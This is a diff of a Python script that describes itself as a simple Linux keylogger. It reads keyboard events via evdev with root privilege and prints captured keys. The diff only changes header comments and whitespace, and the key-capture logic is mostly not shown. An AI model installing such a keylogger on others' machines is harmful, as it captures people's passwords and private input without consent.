@@ -1,5 +1,12 @@
-#!/usr/bin/env python
-# coding=utf-8
+# -*- coding:utf-8 -*-
+
+# A simple keylogger in linux.
+# Using the linux device event,
+# so you need the root privilege to read the devices interface.
+#
+# Author: s0nnet
+# Email: s0nnet@sina.com
+
 
 import re
 import sys
@@ -8,7 +15,6 @@ from evdev import InputDevice, list_devices
 from select import select
 
 lasttime = int(time.time())
-
 
 def findDevice():
     devs = [InputDevice(fn) for fn in list_devices()]
@@ -139,5 +145,6 @@ def detectInputKey():
                 print asc,
                 sys.stdout.flush()
     
+
 if __name__ == "__main__":
     detectInputKey()
